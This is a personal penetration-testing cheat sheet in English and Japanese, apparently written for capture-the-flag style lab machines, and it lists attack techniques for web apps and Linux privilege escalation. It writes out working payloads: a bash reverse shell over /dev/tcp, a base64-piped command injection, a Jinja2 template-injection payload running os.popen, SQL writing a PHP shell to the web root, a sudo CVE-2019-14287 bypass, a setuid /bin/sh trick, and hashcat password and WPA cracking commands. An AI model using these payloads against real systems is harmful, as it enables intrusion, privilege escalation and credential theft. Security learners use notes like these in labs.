# Memo

* kernel exploits
  * [dirty dow](https://dirtycow.ninja/)
    * < 2016/10/21

* miss configuration
  * All
    * default password
  * [nginx](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)
    * directory traversal
  * apache
    * [mime module](https://null-byte.wonderhowto.com/how-to/upload-shell-web-server-and-get-root-rfi-part-1-0162818/)
      * AddHandler application/x-httpd-php php
      * Mime module prioritizes handlers over mimes
        * evil.php.jpg
          * mime .. jpg
          * handler ... php
    * .htaccess
      * RewriteEngine off
      * AddType application/x-httpd-php .png
  * httpd (NetBSD, Medusa)
    * httpd -u user_name
      *  Uniform Resource Locators
      * http://example.com/~user_name/
  * php
    * [xdebug](https://www.acunetix.com/vulnerabilities/web/xdebug-remote-code-execution-via-xdebug-remote_connect_back/)
      * http://example.com?XDEBUG_SESSION_START=xxx
      * X-Forwarded-For: 192.168.1.1
      * nc -l -v -p 9000
      * syn-ackに対しrstが戻ってきて、何故か接続できない時も、試行回数を多くすれば接続可能なケースがある
    * preg_replace
      * e option enables os command injection
    * phpinfo + LFI
      * phpinfoにファイルをアップロードすると、アップロードファイルのファイル名が表示される
      * アップロードファイルは表示後、すぐに削除されるが、レースコンディションでLFIでアップロードファイルを読み込むことが可能

- etc

  - exploit (normal)
    - 見慣れないものを探す
    - タイムスタンプに注目する
    - cms
      - copyright year
      - software version (CHANGELOG.txt ... etc)
    - searchsploit -j software | jq | egrep -C2  '(20XX|20XX)'
  - kernel exploit
    - check kernel timestamp
    - check kernel version
    - check os type and version
    - check cpu arch
    - check module version (dpkg -l)
      - characteristic file name
  - debug exploit
    - check script inputs
      - Is URL correct?
    - check page inputs
      - URL, Get/Post Parameters, Headers
      - requests
        - proxied = {'http': 'http://example.com'}
        - requests.get('http://example.com', proxies=proxies)
      - urlopen
        - export http_proxy="http://example.com"
      - debugger
        - import pdb
        - pdb.set_trace()
  - webpage
    - search page
      - http://example.com/hoo/1/bar
        - iterate numbers
    - search username
      - php may contains username
    - search password
    - search sub domains
    - search comments and hidden pages
  - cron job
    - /var/spool/cron/
    - check the permissions and timestamp of the file if the script creates a file.
    - 'PATH' variable
      - /etc/crontab
      - /var/spool/cron/
  - process
    - ps
    - pspy
      - "pspy -f" show files
    - cron
  - groups
    - container
      - lxc
      - docker
      - create a privileged container and mount a host
    - adm
      - aureport --tty
      - login, register, reset form in access.log
  - files
    - check timestamps, owner and group.
      - alias ls='ls -la --time-style=iso'
    - directory without read permission but has write permission
  - SUID / SGID
    - export PATH=$MY_PATH:$PATH
    - use ltrace to identify embedded commands
  - SUDO
    - secure_path cannot be modified
    - CVE-2019-14287 
      - < sudo 1.8.28
      - ALL=(ALL,!root) /bin/something
      - sudo -u#-1 /bin/something
  - write to a read only configure file
    - mv read_only_file my_file
    - echo 'new file' > read_only_file
  - ssh
    - /etc/motd ... execute by root
    - if /usr/local is writable, allways success privsec
    - ssh-keygen -y -e -f private.key > public.key
  - os command injection
    - sleep
    - ping
    - $((1+2))
    - bash -c 'some codes'
    - check comment tout
      - special_chars command ; command; #
    - echo -n 'code' | base64 -w0 | base64 -d | bash
    - {echo,test}
    - echo$IFS"test"
    - system関数内の改行(system("id\nj/bin/sh"))
    - bash -i >& /dev/tcp/127.0.0.1/4444  0>&1
      - redirect stdout, stderr, stdin to a socket
      - ">&" redirect stdout, stderr to a socket, "0>&1" redirect stdin to stdout(a socket).
    - mkfifo /tmp/input; tail -f /tmp/input | bash 2>&1 > /tmp/output;
      - プロキシなどが間に存在し、リバースシェルが利用できないシーンで活用可能
    - [fstatic compile nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)
      - 侵入したホストでnmapが必要になった時、使用する
  - file transfer
    - nginxの場合、webdavを可能とするにはdav_methods PUT;のように設定
  - fuzzing([ffuf](https://github.com/ffuf/ffuf))
  
    - ffuf -u http://example.com/test?param=FUZZ -w /opt/SecLists/Fuzzing/special-chars.txt -mc all
    - try comment out characters
      - for example, rua's comment out characters are --
      - ffuf -u http://example.com/test?param=FUZZ-- -w /opt/SecLists/Fuzzing/special-chars.txt -mc all
  - shell (privsec)
    - chmod +s /bin/sh
      - sh -p
  - ssti
    - jinja2
      - {{config.\_\_class\_\_.\_\_init\_\_.\_\_globals\_\_['os'].popen('code').read()}}
  - deserialization
    - node.jsで入力がJsonでも、node-deserializeモジュールを利用していれば、デシリアライズに起因するバグが存在する可能性がある
    - nodejsshell.pyで、evalに基づくリバースシェルが可能
  - environ
    - LD_PRELOAD
    - PYTHONPATH
      - python library path
  - write file
    - authorized_keys
    - /var/www/html
    - /var/spool/cron
  - docker
    - check another server
    - privilege?
      - ip link add dummy0 type dummy
    - capability?
      - capsh --print
    - enum
      - [deepce](https://github.com/stealthcopter/deepce)
  - NetBSD
    - doas -u user command
      - same as su
  - database
    - run as root
    - create a user defined function (mysql)
      - sys_exec
  - redis
    - config set dir XXXX
    - config set dbfilename XXXX
    - save
  - pwn
    - base address (No ASLR)
      - ldd bin
      - ただし、lddで出力されるアドレスが正しくない時があるので注意
    - aslr
      - (disable) /proc/sys/kernel/randomize_va_space is 0
      - ldd libc.so.6
      - ldd binary
      - 32bitの場合、アドレスが合致するまで施行するのも視野に入れる
    - /bin/sh
      - 権限昇格においては大半の場合、system("/bin/sh")を実行することが目的となるが、/bin/shでなくともよい
      - 例えばshでもよい
      - system("/tmp/hoge")のようなパスを指定し、/tmp/hogeに実行可能なシェルスクリプトを配置してもよい
      - PATHに適当に追加(Path Injection)し、system("hoo")でもよい
  - wordlist
    - cewl
    - [username-anarchy](https://github.com/urbanadventurer/username-anarchy)
    -  hashcat --force passwords.txt -r /usr/share/hashcat/rules/best64.rule --stdout
      - echo password | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout
  - sql
    - almost cases, passwords are hex (hash values).
      - "abcdef0123456789$"
    - length is 40 chars(sha1).
    - and substr((select password from staff limit 0, 1), 19, 1) = 'a'
      - substr(EXPRESSION, START_FROM_ONE, LENGTH)
    - load data local infile '/etc/passwd' into table 'test'
      - '/etc/passwd' is a client file
    - select '<?php ?>' into outfile '/var/www/html/shell.php';
      - '/var/www/html/shell.php' is a server file
  - LFI
    - php://filter/convert.base64-encode/resource=file_name.php
  - openssl
    - client certificate
      - generate  the private key
        - openssl genrsa -out client.key 4096
      - private key => CSR
        - The CSR is self signed.
        - The CSR constains the public key and is signed with the private key. 
        - openssl req -new -key client.key -out client.csr
      - CSR  + ca.key + ca.crt => CER
        - The certificate is required for filling objects field.
        - openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -set_serial 9001 -extensions client -days 365 -outform PEM -out client.cer
      - CER + private key => PKCS12
        - archive the key and crtificate.
        - openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
  - hashcat
    - hashcat -a 0 -m hash_type hash.txt rockyou.txt
    
    - https://github.com/hashcat/hashcat-utils
    
    - IEEE802.3クラックなどにも使える
    
      ```console
      ┌─[✗]─[rio@parrot]─[~/Htb/Olympus/hashcat-utils/src]
      └──╼ $./cap2hccapx.bin ../../captured.cap  ../../captured.hccapx
      Networks detected: 1
      
      [*] BSSID=f4:ec:38:ab:a8:a9 ESSID=Too_cl0se_to_th3_Sun (Length: 20)
       --> STA=c0:ee:fb:df:fc:2a, Message Pair=0, Replay Counter=1
       --> STA=c0:ee:fb:df:fc:2a, Message Pair=2, Replay Counter=1
      
      Written 2 WPA Handshakes to: ../../captured.hccapx
      ```
    
      
  - vhd
    - 7z l image.vhd
  - elasticsearch
    - search tables
      - curl http://target/_cat/indices
    - row count
      - curl http://target/table_name/_count
    - dump all
      - curl http://target/table_name/_search?size=row_count
  - vnc
    - パスワードファイルを解読可能
    - https://github.com/jeroennijhof/vncpwd

# Tools

- [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
- [pspy](https://github.com/DominicBreuker/pspy)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- [aquatone](https://www.hacking.land/2017/07/aquatone-tool-for-domain-flyovers.html?m=1)



# Refernce

- [Docker Container Breakout: Abusing SYS_MODULE capability!](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd)
- [The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)
- [GTFOBins](https://gtfobins.github.io/)
- [Jinja2 SSTI Research](https://hackmd.io/@Chivato/HyWsJ31dI)
- [hashcat format](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [motd](https://wiki.debian.org/motd)

